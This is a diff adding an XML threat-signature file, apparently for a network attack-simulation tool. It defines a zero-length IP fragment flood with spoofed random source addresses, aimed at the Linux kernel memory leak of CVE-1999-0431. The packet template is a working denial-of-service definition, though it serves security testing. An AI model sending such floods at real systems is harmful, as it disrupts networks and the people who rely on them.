@@ -1,0 +1,67 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Fragment Reassembly: 0 Length Fragment Flood"/>
+    <EngDesc display="true" value="This threat sends multiple IP Fragments representing the first fragment of an IP packet that have no length or payload associated with them.  Multiple Linux kernels and other equipment are reported as vulnerable to this attack.  This attack will create a memory leak."/>
+    <Intent display="true">
+      <item value="Resource_Exhaustion"/>
+      <item value="Fragmentation"/>
+      <item value="Flood"/>
+    </Intent>
+    <Protocol display="true" value="IP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Protocol"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Linux"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Kernel"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true"/>
+    <Credit display="true" value="http://www.securityfocus.com/archive/1/12958"/>
+    <CVEID display="true" value="CVE-1999-0431"/>
+    <bugtraqID display="true" value="2247"/>
+    <OSVDB display="true" value="5941"/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="000000ff4647363c00a900fe009b00c95ad0f861"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="none"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632742245025312500"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="A"/>
+    <SigProtocol display="false" value="IP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value=""/>
+    <Created value="1139461866" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="B"/>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="D"/>
+  </Variables>
+  <Loops>
+    <for index="A"/>
+    <for index="B"/>
+    <for index="C"/>
+    <for index="D"/>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="5" TypeofService="0" TotalLength="14" Identification="@random(0,FFF)" FragmentOffset="0" TTL="20" Protocol="1" HeaderChecksum="" srcIP="@random(0.0.0.0, 255.255.255.255)" destIP="$destIP" options="" Payload="" CE="false" DF="true" MF="true"/>
+    </Ethernet>
+  </Output>
+</threatSignature>
